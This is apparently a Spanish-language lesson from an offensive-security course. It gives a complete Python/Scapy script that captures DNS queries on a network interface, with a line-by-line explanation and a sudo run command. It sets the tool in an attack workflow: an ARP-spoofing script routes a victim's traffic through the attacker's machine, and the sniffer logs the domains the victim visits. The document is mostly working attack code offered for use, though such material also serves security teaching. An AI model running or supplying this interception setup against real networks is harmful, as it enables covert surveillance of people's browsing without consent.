
----
- TAG: #Implementación #Sniffer #Consultas #DNS #Scapy 
-------
En esta clase, nos centraremos en la creación de un rastreador de consultas DNS (DNS Sniffer) utilizando Scapy, una herramienta de Python orientada a la manipulación de paquetes de red para propósitos ofensivos. Un DNS Sniffer es una herramienta ofensiva que permite interceptar y analizar las consultas DNS en una red. Estas consultas son esenciales en la comunicación de Internet, ya que convierten nombres de dominio en direcciones IP.

Con Scapy, aprenderás a capturar paquetes DNS de forma activa para explorar cómo los dispositivos en una red interactúan con servidores DNS. Este conocimiento es crucial en el contexto ofensivo, ya que permite identificar objetivos potenciales para ataques y explotar vulnerabilidades en la comunicación DNS.

Durante la clase, te mostraremos cómo se pueden utilizar estas técnicas para reunir información valiosa sobre una red y sus usuarios, lo que puede ser utilizado en diversas estrategias de ataque. Al final de esta sesión, habrás desarrollado una herramienta ofensiva clave que te permitirá realizar reconocimientos avanzados y explotar debilidades en la gestión de DNS dentro de una red.

----
# Dns_sniffer.py

```python
#!/usr/bin/python3

import scapy.all as scapy

# Función para procesar los paquetes DNS interceptados
def process_dns_packet(packet):
    # Verificar si el paquete contiene una consulta DNS
    if packet.haslayer(scapy.DNSQR):
        # Extraer el nombre de dominio solicitado en la consulta DNS
        domain = packet[scapy.DNSQR].qname.decode()

        # Lista de palabras clave a excluir (ej.: servicios comunes)
        exclude_keywords = ["google", "cloud", "bing", "static", "sensic"]

        # Verificar que el dominio no haya sido visto previamente y que no contenga palabras clave excluidas
        if domain not in domains_seen and not any(keyword in domain for keyword in exclude_keywords):
            domains_seen.add(domain)
            print(f"[+] Dominio interceptado: {domain}")

# Función para iniciar el sniffer de paquetes en una interfaz específica
def sniff(interface):
    # Capturar solo paquetes UDP en el puerto 53 (DNS)
    scapy.sniff(iface=interface, filter="udp and port 53", prn=process_dns_packet, store=0)

# Función principal
def main():
    # Iniciar el sniffer en la interfaz especificada (eth0, por ejemplo)
    sniff("eth0")

if __name__ == '__main__':
    # Inicializar el conjunto de dominios ya vistos para evitar repeticiones
    global domains_seen
    domains_seen = set()

    # Ejecutar la función principal
    main()
```

### Explicación del código:

1. **Importación de Scapy:**
   ```python
   import scapy.all as scapy
   ```
   Scapy es una poderosa librería de Python para manipular paquetes de red, y aquí se usa para capturar y procesar paquetes DNS.

2. **Función `process_dns_packet`:**
   - Esta función toma un paquete capturado y verifica si contiene una consulta DNS (`DNSQR` es el tipo de consulta DNS en Scapy).
   - Si el paquete es una consulta DNS, extrae el nombre de dominio solicitado usando la capa `DNSQR` y lo decodifica.
   - Se utiliza una lista llamada `exclude_keywords` que contiene palabras clave comunes para excluir solicitudes a dominios no deseados, como Google, Bing, y otros servicios habituales.
   - La función agrega el dominio al conjunto `domains_seen` (un set que almacena dominios ya capturados para evitar duplicados) y lo imprime si no está en la lista de palabras clave excluidas.

3. **Función `sniff`:**
   - Esta función inicia el sniffer de paquetes en la interfaz de red especificada (en este caso, "eth0").
   - Usa el filtro `"udp and port 53"` para capturar solo paquetes DNS, ya que estos utilizan el protocolo UDP en el puerto 53.
   - La función `scapy.sniff()` captura los paquetes y ejecuta la función `process_dns_packet` para cada paquete interceptado.

4. **Función principal `main`:**
   - Es la función que se ejecuta cuando se inicia el script. Se llama a la función `sniff()` y se pasa como argumento la interfaz de red donde queremos capturar los paquetes.

5. **Bloque `if __name__ == '__main__'`:**
   - Aquí se inicializa la variable global `domains_seen` como un conjunto vacío. Este conjunto se usa para almacenar los dominios que ya se han interceptado, evitando que el mismo dominio se imprima varias veces.
   - Luego se ejecuta la función `main()` que inicia el proceso de sniffing.

### Explicación del flujo de trabajo:

1. **ARP Spoofing:**
   Primero, ejecutas el script `arp_spoof.py` en otra terminal. Este script realizará el envenenamiento ARP, haciendo que el tráfico de la máquina víctima pase a través de tu equipo.

2. **DNS Sniffer:**
   Después, ejecutas este script `dns_sniffer.py` en tu máquina atacante. Capturará todo el tráfico DNS que pase por tu máquina, debido al envenenamiento ARP.

3. **Filtrado de DNS:**
   El sniffer captura consultas DNS (paquetes que utilizan UDP en el puerto 53), y el script filtra y muestra solo las consultas que no contienen ciertas palabras clave (como "google", "bing", etc.), para enfocarse en los dominios más relevantes.

4. **Evitar duplicados:**
   Se utiliza el conjunto `domains_seen` para asegurarse de que no se impriman múltiples veces los mismos dominios.

5. **Ejecución del script:**
   Al ejecutar el script, debes tener en cuenta la interfaz de red. Si estás usando otra interfaz distinta a `eth0`, debes modificarla en la función `sniff()` para que capture los paquetes en la interfaz correcta.

### Ejecución del sniffer:

Para ejecutar este sniffer, debes ejecutar lo siguiente en tu terminal:

```bash
sudo python3 dns_sniffer.py
```

Este comando debe ejecutarse con privilegios de superusuario (sudo) para permitir la captura de paquetes en la red.

### Resumen:
Este script funciona en conjunto con el envenenamiento ARP para interceptar y filtrar tráfico DNS en la red. Una vez activado, cualquier solicitud DNS que la víctima realice, siempre que no esté en la lista de palabras clave excluidas, será interceptada y mostrada en tu terminal.